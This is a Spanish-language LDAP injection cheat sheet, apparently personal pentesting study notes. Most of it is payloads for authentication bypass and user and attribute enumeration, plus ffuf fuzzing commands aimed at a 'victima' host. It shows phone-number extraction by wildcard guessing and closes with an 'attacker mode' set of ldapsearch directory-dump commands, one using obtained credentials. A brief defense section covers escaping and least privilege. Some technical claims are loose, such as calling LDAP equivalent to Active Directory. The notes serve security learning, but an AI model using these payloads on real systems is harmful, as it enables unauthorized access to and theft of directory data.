## 📚 **Índice**

- [[#🧩 1. ¿Qué es LDAP y por qué existe?]]
- [[#⚠️ 2. ¿Qué es una LDAP Injection realmente?]]
- [[#🎯 3. Cómo piensa un atacante LDAP (modelo mental perfecto)]]
- [[#🩸 4. Operadores LDAP que rompen aplicaciones vulnerables]]
- [[#🛠️ 5. Payloads de LDAP Injection]]
    - [[#5.1 Bypass de autenticación]]
    - [[#5.2 Enumeración de usuarios sin credenciales]]
    - [[#5.3 Enumeración de atributos con fuzzing]]
    - [[#5.4 Extracción de campos específicos (phone number, etc.)]]
- [[#🛰️ 6. Enumeración con ldapsearch]]
- [[#🔍 7. Enumeración automática con Nmap (LDAP NSE)]]
- [[#🧪 8. Fuzzing profesional (ffuf + SecLists)]]
- [[#🚫 9. Defensa correcta contra LDAP Injection]]
- [[#🧨 10. Comandos ofensivos con ldapsearch (modo atacante puro)]]

---

# 🧩 **1. ¿Qué es LDAP y por qué existe?**

LDAP = **Lightweight Directory Access Protocol**, protocolo abierto para consultar y modificar un _directorio_ (base jerárquica de objetos como usuarios, grupos, recursos, etc.).  
Es básicamente el equivalente a **Active Directory**, pero en entornos Linux/Unix.

- Puerto típico: **389**
    
- Almacena: usuarios, contraseñas hashed, grupos, permisos, teléfonos, emails, rutas, políticas internas, etc.
    
- Aplicaciones web consultan LDAP para:
    
    - Autenticación (login)
        
    - Búsquedas internas (empleados, ext, correos)
        
    - Permisos
        

**Si la consulta LDAP se construye concatenando datos del usuario → hay Inyección LDAP.**

---

# ⚠️ **2. ¿Qué es una LDAP Injection realmente?**

Una **LDAP Injection** ocurre cuando el atacante modifica la consulta LDAP agregando operadores del propio lenguaje LDAP, logrando:

- Bypass de autenticación
    
- Enumeración de usuarios
    
- Extracción de atributos sensibles
    
- Modificación del árbol del directorio (si hay privilegios)
    
- Reconstrucción de datos sensibles como teléfonos, correos, rutas
    

Funciona igual que SQLi/NoSQLi pero en su propio lenguaje:

```
(&(uid=USUARIO)(password=CONTRASEÑA))
```

Si inyectas:

```
*)(uid=*))%00
```

→ rompes la estructura, anulas filtros y devuelves datos.

---

# 🎯 **3. Cómo piensa un atacante LDAP (modelo mental perfecto)**

Toda consulta LDAP tiene **filtros lógicos**:

```
(&(attribute=value)(attribute2=value2))
```

Si logras cerrar la consulta y agregar `*` o `)(` puedes:

- Forzar siempre TRUE
    
- Romper validaciones
    
- Comentar el resto
    
- Listar entradas completas
    

Además LDAP permite operadores como:

- `*` → wildcard absoluto
    
- `)(` → rompe el filtro actual
    
- `%00` → comentarios / null-byte
    
- `|` → OR lógico
    
- `&` → AND lógico
    

---

# 🩸 **4. Operadores LDAP que rompen aplicaciones vulnerables**

|Operador|Significado|Uso ofensivo|
|---|---|---|
|`*`|Cualquier valor|Enumerar todo|
|`)(`|Cierra y abre nuevo filtro|Inyección para bypass|
|`%00`|Null-byte|Corta la query|
|`|`|OR|
|`!`|NOT|Manipular lógica|
|`>=` `<=`|Rango|Descubrimiento de atributos|

Ejemplo de consulta vulnerable:

```
(&(uid=INPUT)(password=INPUT))
```

Payload para romperla:

```
*)(uid=*))%00
```

---

# 🛠️ **5. Payloads de LDAP Injection**

## 5.1 **Bypass de autenticación**

```
admin*)(password=*))%00
```

```
*)(uid=*))(|(password=*))%00
```

```
*)(objectClass=*))%00
```

BurpSuite → **Intercept**, envías al **Repeater**, y pruebas:

```
username=*)(uid=*))%00
password=algo
```

---

## 5.2 **Enumeración de usuarios sin credenciales**

Puedes enumerar usuarios con:

```
*)(uid=*))%00
```

---

## 5.3 **Enumeración de atributos con fuzzing**

LDAP tiene atributos como:

- `cn`
    
- `sn`
    
- `uid`
    
- `mail`
    
- `telephoneNumber`
    
- `description`
    
- `employeeType`
    
- `memberOf`
    

Para descubrir cuáles existen → fuzz:

```
*)(FUZZ=*))%00
```

Ejemplo con ffuf:

```
ffuf -X POST -d "filter=*)(FUZZ=*))%00" -u https://victima.com/login -w /usr/share/seclists/Fuzzing/LDAP-attributes.txt
```

---

## 5.4 **Extracción de campos específicos (phone number, etc.)**

Construyes el teléfono probando números:

```
*)(telephoneNumber=3*))%00
```

Probando de 0–9 hasta formar el número completo.

Esto es **real y súper eficaz**.

---

# 🛰️ **6. Enumeración con ldapsearch 

Comando base:

```
ldapsearch -x -H ldap://IP -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'
```

Notas:

- Cambias `example.org` por la víctima:  
    `dc=danielcorp,dc=org` → _danielcorp.org_
    
- `'cn=admin'` es el **filtro de búsqueda**
    
- `-b` es la **base de búsqueda**
    
- `-D` es el **bind DN** (usuario autenticado)
    
- `-x` → autenticación simple (no SASL)
    

**Enumeración del naming context** para arrancar:

```
ldapsearch -x -H ldap://victima -s base namingcontexts
```

---

# 🔍 **7. Enumeración automática con Nmap (LDAP NSE)**

Primero ver scripts disponibles:

```
locate .nse | grep ldap
```

Ejecutar todos los scripts LDAP:

```
nmap -p389 --script ldap* IP
```

Ideal para:

- namingcontexts
    
- usuarios
    
- atributos
    
- objectClass
    
- permisos
    

---

# 🧪 **8. Fuzzing profesional (ffuf + SecLists)**

Buscar atributos desconocidos:

```
ffuf -w /usr/share/seclists/Fuzzing/LDAP-attributes.txt -X POST \
-d "filter=*)(FUZZ=*))%00" -u https://victima.com/auth
```

Buscar valores numéricos (teléfonos):

```
ffuf -w numbers.txt -X POST \
-d "filter=*)(telephoneNumber=FUZZ*))%00" \
-u https://victima.com/search
```

Payload universal:

```
*)(FUZZ=*))%00
```

---

# 🚫 **9. Defensa correcta contra LDAP Injection**

- **Nunca concatenar** input del usuario.
    
- Usar **LDAP parameterized queries**.
    
- Sanitizar:
    
    - `*`
        
    - `|`
        
    - `)`
        
    - `(`
        
    - `%00`
        
- Escapar:
    
    ```
    \ * ( ) \0 /
    ```
    
- Ejecutar la app con privilegios mínimos.
    
- Monitorizar logs de LDAP (consultas anómalas).
    
- En producción usar LDAPS (TLS) y reglas estrictas de bind.
    


---

# 🧨 **10. Comandos ofensivos con ldapsearch (modo atacante puro)**

## 📌 10.1 Descubrir namingContexts (sin credenciales)

```
ldapsearch -x -H ldap://IP -s base namingcontexts
```

---

## 📌 10.2 Enumeración completa (bind anónimo)

```
ldapsearch -x -H ldap://IP -b dc=example,dc=org 'objectClass=*'
```

---

## 📌 10.3 Enumerar usuarios

```
ldapsearch -x -H ldap://IP -b dc=example,dc=org '(objectClass=person)'
```

```
ldapsearch -x -H ldap://IP -b dc=example,dc=org '(uid=*)'
```

```
ldapsearch -x -H ldap://IP -b dc=example,dc=org '(cn=*)'
```

---

## 📌 10.4 Enumerar atributos específicos

```
ldapsearch -x -H ldap://IP -b dc=example,dc=org 'telephoneNumber=*'
```

```
ldapsearch -x -H ldap://IP -b dc=example,dc=org 'mail=*'
```

```
ldapsearch -x -H ldap://IP -b dc=example,dc=org 'memberOf=*'
```

---

## 📌 10.5 Extraer todos los atributos de un usuario

```
ldapsearch -x -H ldap://IP -b dc=example,dc=org '(uid=USERNAME)'
```

---

## 📌 10.6 Búsquedas por patrón (bruteforce / fuzz)

```
ldapsearch -x -H ldap://IP -b dc=example,dc=org '(telephoneNumber=3*)'
```

```
ldapsearch -x -H ldap://IP -b dc=example,dc=org '(uid=adm*)'
```

---

## 📌 10.7 Bind con credenciales obtenidas (post-inyección)

```
ldapsearch -x -H ldap://IP \
-D "cn=admin,dc=example,dc=org" -w admin \
-b dc=example,dc=org 'objectClass=*'
```

---

## 📌 10.8 Dump total del directorio (si está mal configurado)

```
ldapsearch -x -H ldap://IP -b "" -s sub "(objectClass=*)"
```

---

## 📌 10.9 Enumerar el esquema (schema)

```
ldapsearch -x -H ldap://IP -b cn=schema 'objectClass=*'
```

---

## 📌 10.10 Enumerar Organizational Units (OU)

```
ldapsearch -x -H ldap://IP -b dc=example,dc=org '(objectClass=organizationalUnit)'
```

---

